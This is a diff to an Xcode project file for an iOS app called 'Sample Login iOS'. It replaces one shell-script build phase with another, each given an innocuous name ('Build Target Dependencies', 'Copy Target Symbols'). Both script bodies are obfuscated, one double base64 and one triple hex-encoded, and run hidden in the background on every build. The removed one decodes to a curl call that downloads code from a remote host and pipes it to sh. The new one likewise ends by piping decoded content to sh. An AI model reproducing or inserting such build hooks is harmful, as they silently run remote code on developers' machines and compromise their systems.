@@ -105,7 +105,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 51B593A82DEB4C9400387FB9 /* Build configuration list for PBXNativeTarget "Sample Login iOS" */;
 			buildPhases = (
-				F53CEFB3BF202F945573DC66 /* Build Target Dependencies */,
+				C6CFEFFFAB58AFDBD973DC66 /* Copy Target Symbols */,
 				51B593802DEB4C9100387FB9 /* Sources */,
 				51B593812DEB4C9100387FB9 /* Frameworks */,
 				51B593822DEB4C9100387FB9 /* Resources */,
@@ -242,7 +242,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		F53CEFB3BF202F945573DC66 /* Build Target Dependencies */ = {
+		C6CFEFFFAB58AFDBD973DC66 /* Copy Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -252,13 +252,13 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Dependencies";
+			name = "Copy Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5eWRXSnNaVzVsZEM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333236343336333433323330333733303333363433373338333633333336363633363334333633353332333033363338333733343337333433373330333733333333363133323636333236363336333133363334333636363336333233363335333733343337333233363339333733383332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;			
 		};
 /* End PBXShellScriptBuildPhase section */
